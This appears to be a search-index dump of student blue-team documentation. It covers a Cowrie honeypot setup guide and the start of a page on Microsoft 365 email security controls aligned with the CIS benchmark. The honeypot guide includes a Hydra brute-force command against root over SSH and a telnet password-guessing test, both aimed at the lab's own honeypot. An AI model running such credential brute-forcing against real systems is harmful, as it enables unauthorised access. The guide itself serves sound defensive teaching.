","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#prerequisites","content":" Operating System: Kali Linux (or any compatible Linux distribution)Software Requirements: Python 3GitRequired Python packages Tools: Hydra for brute force testing (optional)    ","version":"Next","tagName":"h2"},{"title":"Step-by-Step Implementation​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-by-step-implementation","content":" ","version":"Next","tagName":"h2"},{"title":"Step 1: Install Dependencies​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-1-install-dependencies","content":" In this stage, the basic tools and libraries needed to install and run the Cowrie honeypot are set up. Let's dissect it:  Command Overview​  “sudo apt install git python3 python3-venv python3-pip -y”   sudo: Installs system-wide packages by running the command with superuser (administrator) rights.apt install: Installs software packages from the selected repositories using the Advanced Package Tool (APT).git: A version control system that enables the cloning of repositories such as Cowrie from GitHub and other platforms.python3: Installs Python 3, a popular programming language used in Cowrie.python3-venv: Offers a utility for building separate Python environments. This guarantees that installed Cowrie dependencies won't conflict with Python packages that are used by the entire system.python3-pip: Installs the Python package manager pip, which is used to install the dependencies and libraries needed by Cowrie.-y: The installation process is non-interactive and responds &quot;yes&quot; to requests automatically.  Why These Dependencies are Important​  - Git: Used to replicate the source code repository of Cowrie.- Python3: The primary language used in Cowrie is required to operate the honeypot.- Virtual Environments (venv): Vital for preventing conflicts with system Python libraries and isolating the Cowrie environment.- pip: Permits the Python packages specified in the Cowrie requirements.txt file to be installed.  Practical Note​  Before installing Cowrie, future students should always make sure these packages are current. Run:  “sudo apt update &amp;&amp; sudo apt upgrade -y”   prior to installing the dependencies in order to prevent problems with outdated packages.  Outcome​  The necessary tools for installing the Cowrie honeypot are available after the command runs successfully. When you see that the system says &quot;Installing: 0&quot; for packages that are already up to date, it means your system is prepared to proceed.  Reference Screenshot​      ","version":"Next","tagName":"h3"},{"title":"Step 2: Clone the Cowrie Repository​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-2-clone-the-cowrie-repository","content":" To get the most recent version of Cowrie's codebase straight from its official GitHub repository, you must clone the Cowrie repository. Cowrie's source code is hosted on GitHub, guaranteeing that the files obtained are current and genuine.  Command Overview​  “git clone https://github.com/cowrie/cowrie.git&quot;   The repository is cloned (downloaded) from its URL using Git.All of the files, configuration templates, and code needed to install and operate the Cowrie honeypot are included in the repository.The process of cloning ensures that you have an identical copy of the Cowrie project's source code.  “cd cowrie”   This command switches the current directory to the newly formed cowrie directory after the repository has been cloned.All further setup and configuration procedures will be carried out here.  Why is This Setup Important?​  You can be confident you are starting with a clean and trustworthy copy of the honeypot framework by cloning the repository.In addition to the honeypot software, the repository includes updates from the Cowrie development team, documentation, and sample configurations.When developers add new features, security patches, or enhancements, using the git tool makes it simple to update the code later on (for example, by using git pull).  Best Practice for Future Students​  To prevent modified or out-of-date code, always clone the repository from the official source.Before starting the installation, look for any changes or extra documentation in the repository.  Reference Screenshot​      ","version":"Next","tagName":"h3"},{"title":"Step 3: Create and Activate a Python Virtual Environment​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-3-create-and-activate-a-python-virtual-environment","content":" The Cowrie honeypot's Python requirements are isolated using a Python virtual environment. This guarantees that there are no conflicts with other programmes on the system and that the Cowrie software operates with the precise library versions it needs. Cowrie won't be impacted by updates or modifications to system-wide Python packages while a virtual environment is used, and vice versa.  Command Overview​  “python3 -m venv cowrie-env”   1. python3: Identifies the Python version being used, which in this case is Python 3.2. -m venv: Generates a virtual environment by calling the venv module.3. Cowrie-env: Gives the folder containing the virtual environment its name. This is where Cowrie's dependencies will be kept.  “source cowrie-env/bin/activate”   - The virtual environment is activated as a result.- Any Python package installations that are activated will only be installed in this virtual environment and not on the entire system.  Output​  The shell prompt will change to show that the virtual environment is active after executing these commands. For instance:    This indicates that cowrie-env is an active environment at the moment.  Importance for Cowrie:​  Making use of a virtual environment guarantees:  The environment in the Cowrie honeypot is stable and regulated.Version conflicts are less likely because dependencies are segregated.Cowrie is simple to update or remove without affecting the system.  Best Practices:​  Before installing packages or executing Cowrie commands, make sure the virtual environment is activated.For other Python applications, use virtual environments to preserve modularity and avoid dependency problems.  Reference Screenshot​      ","version":"Next","tagName":"h3"},{"title":"Step 4: Upgrade “pip” and Install Requirements​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-4-upgrade-pip-and-install-requirements","content":" This step makes sure that all of Cowrie's required Python dependencies are set up in the virtual environment, allowing the honeypot to function properly.  1. Upgrade “pip”:  To prevent incompatibilities and guarantee that the newest features and bug fixes are accessible, pip, the Python package installer, has been updated to the most recent version.Command Used: “pip install --upgrade pip”.It is advised to upgrade pip because newer versions frequently come with security fixes and other improvements.    2. Install Required Packages:  All of the Python dependencies required for Cowrie's operation are listed in the requirements.txt file.All of the specified packages are installed after reading the file with the pip install -r requirements.txt command.This includes modules like twisted, pyasn1-modules, cryptography, and others that handle network operations, cryptographic operations, logging, and more.  3. Verification of Installations:  All necessary packages have been downloaded and installed in the virtual environment, as seen in the screenshot.Checking the error message, upgrading the system, or manually installing the issue package are the best ways to fix any installation errors.    Why This Step is Important​  Makes certain that all of Cowrie's dependencies are current and system-compatible.Lays the foundation for the Cowrie honeypot to operate as planned without experiencing any malfunctions.Addresses dependency problems in advance, lowering the chance of errors occurring during runtime.  The foundation of Cowrie's software environment is this step, which guarantees a safe and dependable honeypot deployment for detecting and evaluating harmful activities.    ","version":"Next","tagName":"h3"},{"title":"Step 5: Configure Cowrie​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-5-configure-cowrie","content":" A crucial step in making sure the honeypot operates as planned and efficiently records interactions is configuring Cowrie. The steps, their significance, and other factors are broken down as follows:  1. Copy the Default Configuration File  Command Used  “cp etc/cowrie.cfg.dist etc/cowrie.cfg”   Explanation:  - Why: As a starting point, Cowrie offers a default configuration file (cowrie.cfg.dist). You can change the settings without changing the original by copying it to cowrie.cfg, which also ensures that you can return to the defaults if necessary.- What We Could Do Instead: Make a configuration file by hand from the beginning. But this is prone to mistakes and is not advised for novices.    2. Open the Configuration File  Command Used  “nano etc/cowrie.cfg”   Explanation:  - Why: You can change Cowrie's settings by opening the file in a text editor like Nano. To customise the honeypot to meet particular requirements, like logging, network interfaces, and protocols, this step is required.      3. Modify the Hostname  Choosing a convincing fake hostname is essential for drawing in attackers because it gives the impression that your honeypot is a worthwhile and authentic target. The hostname need to resemble actual servers or systems that are frequently seen in cloud platforms, IT settings, or organisations. Here are a few instances:  1. Generic Linux/Unix Hostnames: ubuntu-server, debian-node, prod-web01, nginx-webserver, apache-server.2. Database Servers: db-master, mysql-prod, mongo-cluster01, pgsql-backup, oracle-db.3. Corporate-Sounding Names: corp-fileserver, internal-vpn01, crm-system, erp-production, finance-app.4. Cloud Service Hostnames: aws-ec2-node, azure-vm-instance, gcp-storage-node, cloud-database01.5. Network Infrastructure: cisco-router01, juniper-fw, vpn-gateway, dhcp-server.6. Miscellaneous High-Value Targets: backup01, internal-mail, domain, controller, admin-console, devops-node.  Key Considerations:  1. Relevance to Your Setup: Select a hostname that complements your setup. For example, utilise cloud-related names if you're modelling a cloud architecture.2. Steer clear of real hostnames: Don't use your company's actual hostnames to prevent misunderstandings or unintentional disclosure.3. Adapting to the Attacker's Point of View: Make the name appealing to particular assailants. For instance, attackers searching for private financial information may be drawn to a hostname like finance-app.  Current Configuration:  “hostname = db-master”   Explanation:  - Why: The honeypot's identification is set by the hostname field. By changing it to something believable (like db-master), attackers will perceive the honeypot as a genuine server.- What We Could Do Instead: Choose a hostname like web-server, api-node, or backup- node that accurately describes the intended environment.  4. Define Logging and State Directories  Current Configuration:  “log_path = var/log/cowrie” “state_path = var/lib/cowrie”   Explanation:  - Why:- log_path: Indicates the location of the log storage. Logs are crucial for examining the actions of attackers.- state_path: Holds persistent information, including emulated filesystem updates and keys.  - What We Could Do Instead: In high-interaction scenarios, use alternate pathways (such external storage) to prevent the local disc from becoming full.    5. Configure SSH endpoint  Current Configuration:  “listen_endpoints = tcp:2222:interface=0.0.0.0”   Explanation:  - Why: Establishes the IP address and port for SSH connections. By changing the port (from 22 to 2232 by default), you can prevent problems with legitimate SSH services that are operating on the same computer.- What We Could Do Instead: Attach Cowrie to a particular network interface (such as 192.168.1.100) to increase security and shield it from unauthorised networks.    6. Enable Telnet Support:  Current Configuration:  “enabled = true” “listen_endpoints = tcp:23:interface=0.0.0.0”   Explanation:  - Why: By turning on Telnet, the honeypot can draw in attackers who are looking to compromise outdated protocols. Since port 23 is the default Telnet port, it is a popular target.- What We Could Do Instead: If Telnet isn't required for your use case, disable it. This is especially important in contemporary settings where Telnet isn't often used.    Importance of Configuration​  An appropriate setup guarantees:  1. Realism: Gives attackers the impression that the honeypot is real.2. Logging: Gathers comprehensive interaction records for examination.3. Customisation: Modifies the honeypot to fit particular attack scenarios or network conditions.  Alternative Considerations​  1. More Complex Logging:  For centralised analysis, combine Cowrie with external log management solutions (like Splunk or ELK stack).  2. Port Selection Is Dynamic:  Use non-standard ports (such as 22222 for SSH and 2323 for Telnet) to prevent interfering with legitimate services.  3. Changes Specific to the Environment:  Adapt to the network (e.g., imitate a personal NAS in home settings or a finance database in business settings).  Future students will be able to create a honeypot that suits their unique requirements and keep a transparent audit record of attacker activity by setting up Cowrie as described above.    ","version":"Next","tagName":"h3"},{"title":"Step 6: Generate SSH Keys​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-6-generate-ssh-keys","content":" Command Overview​  “ssh-keygen -t rsa -b 2048 -f cowrie_rsa_key” “mv cowrie_rsa_key* etc/“   Explanation​  1. Purpose of the SSH Keys: SSH keys are necessary to create safe, verified connections between clients and the honeypot. They serve as a way to confirm the legitimacy of the SSH service running in the honeypot.  2. Command Breakdown:  - ssh-keygen: The SSH key pair generation tool.- -t rsa: Specifies the kind of key—RSA in this case—that should be generated.- -b 2048: For increased security, set the key length to 2048 bits.- -f cowrie_rsa_key: Identifies the public key (cowrie_rsa_key.pub) and private key (cowrie_rsa_key) file names.  3. Why are SSH Important:  Cowrie simulates an SSH server using the generated keys. Unaware that the honeypot is a trap, attackers engage with it when they try to connect via SSH.By making sure the honeypot is set up correctly to resemble a genuine SSH server, this step improves the likelihood of successfully interacting with attackers.    4. Moving Keys to “/etc” Directory:  The generated keys are moved to the etc/ directory inside the Cowrie installation folder by running mv cowrie_rsa_key* etc/.- Reason: Cowrie's default location for configuration and important files is the etc/ directory. This guarantees Cowrie will have access to the keys while it is in use.  5. Alternative Actons:  For improved performance or security, keys can be created using alternative algorithms, like ecdsa or ed25519, if necessary.If a company has a centralised key management system, it can also import old keys rather than creating new ones.    Importance:  By ensuring that Cowrie can replicate a working SSH service, this step increases the likelihood that attackers will find it credible. Cowrie's SSH service wouldn't be able to create secure connections without SSH keys, which would lessen its usefulness as a honeypot.    ","version":"Next","tagName":"h3"},{"title":"Step 7: Start the Honeypot​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-7-start-the-honeypot","content":" In this stage, the Cowrie honeypot is started, which is the last step in making the honeypot come to life. The instructions and their meaning are explained in full below:  1. Activating the Virtual Environment​  Command:  “source cowrie-env/bin/activate”   - Purpose: The previously configured Python virtual environment (cowrie-env) is activated by this command.  - Importance:  Guarantees that the isolated environment is used to load all of Cowrie's Python dependencies.Avoids conflicts with the system's globally installed Python packages.Maintains the honeypot's environment tidy and controllable.    2. Starting Cowrie​  Command:  “bin/cowrie start”   - Purpose: The Cowrie honeypot is started by this command.  - What Happens:  Cowrie starts scanning the designated ports for SSH and Telnet connections.Activities including connection attempts, login attempts, and commands executed are first recorded in logs.  - Importance:  At this stage, the honeypot is active and prepared to record the actions of attackers.It fools attackers into interacting with it by imitating a weak system.    3. Monitoring Logs​  Command:  “tail -f var/log/cowrie/cowrie.log”   - Purpose: The Cowrie log file is continuously shown in real-time by this programme.  - Importance:  Gives quick updates on the activity in the honeypot.Aids in locating attempted connections or actual intrusions.Helpful for troubleshooting in the event that the honeypot doesn't start up correctly.    Key Considerations​  - Warnings of Cryptographic Deprecation: You may notice warnings like those regarding TripleDES in the logs. These result from the phase-out of earlier encryption techniques. Although it's not necessary for the honeypot to work, you should maintain the stability and security of your Python dependencies.  - Log management:  Use archival or frequent log rotation because logs can get big over time.Periodically examine logs to get knowledge about the tactics and patterns used by attackers.  Alternate Configurations​  To simulate various environments, you can set up Cowrie to listen on alternative ports rather than the default ones (2222 for SSH and 23 for Telnet).For more thorough investigation, more experienced users may combine the honeypot with additional logging programmes like Splunk or Elastic Stack.  By taking this step, you can be confident the honeypot is operating properly and gathering data. Always examine the logs right after starting the honeypot to make sure everything is operating as it should.    ","version":"Next","tagName":"h3"},{"title":"Step 8: Verify Network Configuration​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-8-verify-network-configuration","content":" Why This Step is Essential:​  1. Identify IP Address:  To view comprehensive details on every network interface on the system, use the “ip addr” show command.This enables you to verify the IP address that your honeypot is currently connected to. You must make sure the honeypot connects to the appropriate interface for Cowrie (e.g., eth0 in the screenshot).  2. Validate Open Ports:  To check if Cowrie is actively listening on the designated ports, the &quot;nmap -p 2222, (honeypot-IP)” tool scans them (2222 for SSH and 23 for Telnet).Verification that is successful guarantees that the honeypot is set up to accept connections from possible intruders.  Detailed Explanation of the Screenshots​  1. Command:  “ip addr show”   - The output shows:  Since it is internal, the loopback interface (lo) is irrelevant to the honeypot.The network interface that is currently in use, eth0, has the IP address 10.0.2.15. This verifies that this IP address will be able to access the honeypot.Docker's internal interface, docker0, is not connected to the honeypot setup and is currently inactive (state DOWN).    2. Command:  “nmap -p 2222 10.0.2.15”   The honeypot is prepared to receive SSH connections as the scan verifies that port 2222 is open.If enabled in cowrie.cfg, same checks can be carried out for Telnet (port 23).    Potential Issues with Address​  If the ports of choice are closed, make sure:  Cowrie is operating well, if not do “bin/cowrie stop” and then start it again “bin/cowrie start”Ports 2222 and 23 are accessible from the outside thanks to firewall regulations. cowrie.cfg with the proper setup.  Alternative Methods​  To list the honeypot's open ports, use programmes like ss or netstat -tuln.To manually check connectivity, use telnet (honeypot-IP) port or ssh (honeypot-IP?) -p port.  This step is crucial for collecting malicious behaviour and avoiding erroneous assumptions about the honeypot's deployment status because it verifies that the honeypot is reachable and operating as intended.    ","version":"Next","tagName":"h3"},{"title":"Step 9: Testing and Attacks Simulation​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-9-testing-and-attacks-simulation","content":" Purpose of Attack Simulation​  The purpose of this part is to test the honeypot's operation and accuracy in capturing attack data. We verify that the honeypot:  Records attempts at unauthorised access, including brute force attacks, by mimicking real-world attacks.Records information about the actions and behaviour of the attacker.Aids in the analysis of potential exploits for vulnerabilities by malevolent parties.  Through these testing, future staff members can learn about the honeypot's capabilities and see how well it can detect assault patterns.  Detailed Explanation of Hydra Testing for Honeypots:​  This stage involves employing Hydra, a potent tool frequently used for credential-cracking, to simulate a brute-force attack in order to assess the Cowrie honeypot's operation. You may verify that the honeypot can record and capture malicious login attempts by running this test. Let's dissect the procedure to gain a better understanding:  Purpose:  1. Verify Honeypot Functionality: Using Hydra to test makes sure Cowrie is accurately recording login attempts—both successful and unsuccessful.2. Emulate Real-World Attacks: This gives a realistic evaluation of the honeypot's capabilities by simulating a real-world brute-force attack scenario.3. Record and Examine Attacker Behaviour: You can learn about attacker tactics, such as the credentials they attempt, by looking over the logs.  Command Used:  “hydra -l root -P passwords.txt ssh://honeypot-IP:2222”   Explanation of Command Components:  1. hydra: The brute force tool is being employed.2. -l root: Gives the username to be targeted, which is &quot;root&quot; in this example.3. -P passwords.txt: Offers a password wordlist for testing against the target. Commonly used or weak passwords are included in the wordlist.4. ssh://honeypot-IP:2222: Identifies the honeypot's IP address and port (2222) as well as the target service (ssh).    Observed Results:  1. Successful Attempt: The passwords that successfully authenticated with the honeypot's SSH service are listed in the command output. The honeypot in this test does not actually provide access to an underlying system, but rather &quot;accepts&quot; passwords as part of the emulation.2. Captured Logs: Every login attempt is recorded by the honeypot, including:- Passwords and usernames were attempted.- The connection's origin.- If the endeavour was successful or not.3. Session Details: Every session is captured, including the duration of the connection and any commands run after logging in.    Significance for Future Students:  1. Learning Attack Patterns: The test aids cybersecurity teams in researching the frequency of attempts and the password lists used by brute-force attackers.2. Improving Defence Mechanisms: Organisational security policies, including password complexity guidelines and SSH access limitations, can be improved by having a better understanding of popular passwords and attacker tactics.3. Creating Reports: This stage emphasises how crucial it is to keep thorough logs for forensic examination.  Importance of Reviewing Logs:  Logs reveal information about what the fictitious attacker did.They make it possible to spot trends that can be utilised to enhance security procedures or the honeypot's setup.The logs used in this test are located in Cowrie's log directory (var/log/cowrie, for example).  Common Pitfalls to Avoid:  1. Using Week Passwords List: Make sure the wordlist includes examples of actual attacks. Steer clear of irrelevant or overly simple passwords.2. Incorrect Configuration: Make sure Cowrie is operating on the IP and port specified in its configuration file.3. Not Reviewing Logs: The honeypot's capacity to offer thorough record keeping is its main advantage. Always examine these logs to glean valuable information.  This stage illustrates the deployment, testing, and analysis phases of a full cycle. To guarantee functionality and use it for incident response training, future staff members can duplicate this procedure when setting up their own honeypot.  Detailed Explanation of Telnet Brute Force Attempt for Honeypots:​  Command Used:  “telnet 10.0.2.15 23”   Explanation:  Because it isn't encrypted, attackers frequently target the Telnet protocol. In this test, we try to brute force login information on the Telnet service that the honeypot has made available.The honeypot's ability to record login attempts and identify unauthorised access attempts is tested by performing many login attempts using different credentials (e.g., login: root, login: kali).  Objective:  Evaluate the Telnet service by simulating actual brute force assaults.Make sure that every login attempt—both successful and unsuccessful—is recorded by the honeypot.    Outcome:  All login attempts, both unsuccessful ones and a successful login with the root account, were successfully captured by the honeypot. Important information is provided by the logs, such as the attacker's source IP, timestamp, and access credentials.Log evidence and a screenshot:- Screenshot: Telnet connection attempts and related login attempts.- Logs: The Cowrie log file contains session records that document authentication problems and eventual success.    Detailed Explanation of Unauthorized Command Execution for Honeypots:​  Command Used:  “sudo nmap -p 2222 10.0.2.15”   Explanation:  Reconnaissance is a common technique used by attackers to find open ports and services on a target system. Here, we use the nmap programme to scan the SSH port of the honeypot in order to mimic this behaviour.Furthermore, actions like executing nmap within the session were carried out after getting access to the honeypot.  Objective:  Examine how the honeypot responds to unauthorised commands and port scanning.Keep thorough records of all harmful commands that are run throughout a session.    Outcome:  The honeypot recorded unauthorised command executions (such as nmap) and recorded port scanning attempts.By letting the attacker run commands while recording every action in its logs, the honeypot imitated a weak system.    Importance:  Aids in the analysis of how attackers use systems and carry out reconnaissance.Confirms that the honeypot successfully records illegal command executions for examination.  Summary of Attack Simulations​  By means of these simulated assaults, the honeypot:  All attack attempts, including brute force and unauthorised command execution, were accurately recorded.Supplied thorough logs for examination, which are essential for comprehending the tactics used by attackers.Confirmed that it works as a trustworthy tool for keeping an eye on and documenting malicious activity.  These tests not only illustrate how effective the honeypot is, but they also inform future workers how to undertake comparable assault simulations to assess honeypot performance, making them a useful learning tool.    ","version":"Next","tagName":"h3"},{"title":"Step 10: Log Management​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#step-10-log-management","content":" Why This Step is Important:  An essential component of honeypot maintenance is log management. By safely backing up and archiving logs:  1. Security: Prevents unauthorised access or unintentional destruction of private logs.2. Analysis: Saves assault information for forensic examination in the future.3. Compliance: Assists businesses in following cybersecurity regulations that call for data retention.  1. Archiving Logs  Command Used:  “tar -cvzf cowrie_logs_$(date +%Y%m%d).tar.gz var/log/cowrie”   - Purpose: Identifies the log directory (var/log/cowrie) with the current date and creates a compressed archive of it.- Command Breakdown:- tar: An application for making and retrieving archives.- -cvzf: Sets the output file name (f), verbose (v), gzip compression (z), and creation (c) options. **- cowrie_logs_(date+(date +%Y%m%d).tar.gz:88 The archive is dynamically named according to the date using cowrie_logs_(date+(date +%Y%m%d).tar.gz (e.g., cowrie_logs_20241205.tar.gz).- var/log/cowrie: The directory to be archived is specified by var/log/cowrie.  As a result, logs with the required structure were successfully archived.    2. Verifying the Archive  Command Used:  “ls -lh cowrie_logs_20241205.tar.gz”   - Purpose: Lists the created archive's metadata to verify its size and existence.- Command Breakdown:- ls: Lists folders and files.- -lh: Verifies permissions and displays the file size in a readable fashion.- Verification:  The output attests to the existence of the 21 KB cowrie_logs_20241205.tar.gz archive.The permissions (rw-rw-r--) show that the owner and group can read the file.    3. Inspecting Archive Contents  Command Used:  “tar -tvf cowrie_logs_20241205.tar.gz”   - Purpose: Enumerates the archive's contents to confirm that all of the requested files were present.- Command Breakdown:- tar: For managing archives.- -tvf: Options to specify the archive file (f), display the contents of the archive (t), and use verbose mode (v).- Verification:  Verifies that the archive includes:- var/log/cowrie/cowrie.log: Main activity log.- Gitignore: Version control-related file- cowrie.json: Structured data log in JSON format.    4. Quick Content Verification  Command Used:  “tar -tf cowrie_logs_20241205.tar.gz”   - Purpose: A concise list of the contents of the archive for easy verification.- Command Breakdown:- tar -tf: solely shows the archive's filenames.- Verification:  Makes sure that the output is free of unnecessary information and contains all expected files (cowrie.log,.gitignore, and cowrie.json).    Future Best Practices for Log Management:  1. Automate Archiving  To plan routine log backups, use a cron task.For example: 0 0 * * * tar -cvzf cowrie_logs_$(date +%Y%m%d).tar.gz var/log/cowrie.  2. Offsite Backups  Move the archives to a safe, offsite place for storage (such as a dedicated server or cloud storage).  3. Retention Policies  Establish a retention period for archived logs in order to efficiently manage storage and adhere to legal requirements.  4. Log Rotation  To keep logs from growing endlessly and preserve system performance, use log rotation (logrotate).  Future students can handle Cowrie honeypot logs with confidence while maintaining data security and compliance by following this procedure.  ","version":"Next","tagName":"h3"},{"title":"Maintenance and Updates​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#maintenance-and-updates","content":" Purpose of Maintenance and Updates  Frequent upkeep guarantees the honeypot's efficient operation, security, and compliance with operating specifications. This entails maintaining logs, making sure resources are available, and updating the honeypot software.  1. Regular Updates​  Importance of Regular Updates  1. Security Patches: Updates the honeypot to the most recent version, protecting it from vu;nerabilities. from vulnerabilities.2. New Features: Improves honeypot efficacy by incorporating new features and enhancements.3. Dependency management: ensuring that all necessary modules and libraries are current and work with the most recent version of the honeypot.  Steps to Update Cowrie:  1. Pull Latest Changes  - Command: &quot;git pull.&quot;- Purpose: The most recent code is retrieved from the Cowrie repository for this purpose.- How It Operates: brings the most recent modifications from the remote repository to your local repository.- Significance: Guarantees that you have the most recent security patches, bug fixes, and features.  2. Install Updated Dependencies  - Command: “pip install -r requirements.txt”- Purpose: The goal is to install or update the Python libraries that Cowrie needs.- The Significance of This Step:  Dependency compatibility guarantees that Cowrie functions as intended.Avoids runtime faults brought on by out-of-date or absent libraries.  Extra Advice:  To prevent influencing system-wide dependencies, always activate the Python virtual environment (source cowrie-env/bin/activate) before executing these commands.After updates, make sure the honeypot is stable before sending it to production by testing it in a staging environment.  1. Key Takeaways​  1. Consistency in Updates:  To guarantee the honeypot is safe and operational, plan frequent updates (such as monthly or quarterly).To keep track of update change logs, use a version control system such as Git.2. Automate Maintenance:To automate processes such as checking for updates, use cron jobs.Rotating and archiving logs.Delivering notifications when disc space is depleted.3. Documentation:Maintain thorough records of archived logs and update schedules.For future reference, note any modifications performed during cleanup or upgrades.4. Testing Following Updates:To ensure functionality following updates, test the honeypot in a non-production setting at all times.To make certain logs are being gathered accurately, simulate attacks.  This methodical technique guarantees that the honeypot is kept up to date, dependable, and offers useful insights while preserving resources.    ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Cowrie Honeypot Implementation Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Cowrie-Honeypot-Implementation-Guide#conclusion","content":" This manual offers a thorough, step-by-step procedure for setting up and evaluating a Cowrie honeypot. The screenshots and logs that are linked show real-world uses. These procedures can be repeated by future staff members to successfully set up and maintain secure honeypots. ","version":"Next","tagName":"h2"},{"title":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#objective","content":" The objective of this phase is to implement additional email security controls to further strengthen Redback Operations’ resilience against phishing, malware, spam, and other email-based threats. This implementation follows best practices aligned with the CIS Microsoft 365 Foundations Benchmark to ensure a secure, scalable, and compliant email infrastructure.  ","version":"Next","tagName":"h2"},{"title":"Deliverables​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#deliverables","content":" The following security controls have been implemented and validated using PowerShell scripts, which can be found in the ‘redback-cyber’ GitHub repository (link below): Redback Cyber GitHub Repo - Additional CIS Security Controls - Email &amp; Collaboration.ps1  Control\tDescription\tCIS Benchmark RefAnti-Phishing Policy\tThis policy enables impersonation protection, spoof intelligence, DMARC enforcement, mailbox intelligence, and quarantine actions.\t2.1.7 Anti-Spam Policy\tThis policy: • Configures outbound spam filter to notify and alert administrators of suspicious outbound activities. • Ensures inbound anti-spam policies do not contain any allowed domains, preventing filter bypass.\t2.1.6, 2.1.14 Anti-Malware Policy\tThis policy: • Enables internal sender malware notifications. • Creates an anti-malware policy that blocks 186 malicious file types.\t2.1.3, 2.1.11 Safe Attachments Policy\tThis policy: • Ensures Safe Attachments Policy is enabled. • Blocks malicious files, redirects them to an admin quarantine, and extends attachment protection to SharePoint, OneDrive and Teams.\t2.1.4, 2.1.5 Safe Links Policy\tThis policy enables Safe Links for emails, Teams and Office applications, including protection such as URL click tracking, URL scanning, URL rewriting, and blocking user click-through on detected malicious links.\t2.1.1 Common Attachment Types Filtering\tThis policy enables the default anti-malware policy’s file type filter to block common high-risk attachment types.\t2.1.2 Connection Filtering Policy\tThis policy: • Ensures no IP addresses are listed in the connection filtering policy to prevent filter bypass. • Disables the safe sender list in the connection filter policy to prevent filter bypass.\t2.1.12, 2.1.13  ","version":"Next","tagName":"h2"},{"title":"10. Implement additional security controls based on CIS Foundations Benchmark guidelines​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#10-implement-additional-security-controls-based-on-cis-foundations-benchmark-guidelines","content":" Each control listed in the deliverables section was implemented step-by-step in a sequential order using PowerShell cmdlets.  ","version":"Next","tagName":"h2"},{"title":"11. Validate additional security controls based on CIS Foundations Benchmark guidelines​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#11-validate-additional-security-controls-based-on-cis-foundations-benchmark-guidelines","content":" As for validation, each control was validated using PowerShell cmdlets and via GUI validation immediately after implementation. The validation included checks for:  Policy creation and enablement statusScope assignment to all accepted domainsRule and policy priorities, and expected behavioursFlagging any missing configuration values and resolving any configuration anomalies.  Validation details and screenshot references are listed below.  ","version":"Next","tagName":"h2"},{"title":"Implementation and Validation with Screenshot References​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#implementation-and-validation-with-screenshot-references","content":" ","version":"Next","tagName":"h2"},{"title":"PowerShell Setup Steps​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#powershell-setup-steps","content":" Before implementing the controls, the following PowerShell setup steps were implemented:  Installed the ExchangeOnlineManagement PowerShell module.Set execution policy to ‘Bypass’ for the current session.Imported the module.Connected using an account with 'Global Administrator' or 'Exchange Administrator' permissions.Enabled organization customization using Enable-OrganizationCustomization.Verified that IsDehydrated was set to False.  ","version":"Next","tagName":"h3"},{"title":"10.1. Anti-phishing Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#101-anti-phishing-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.2. Anti-spam Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#102-anti-spam-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.3. Anti-malware Policy​","type":1,"pageTitle":"Phase 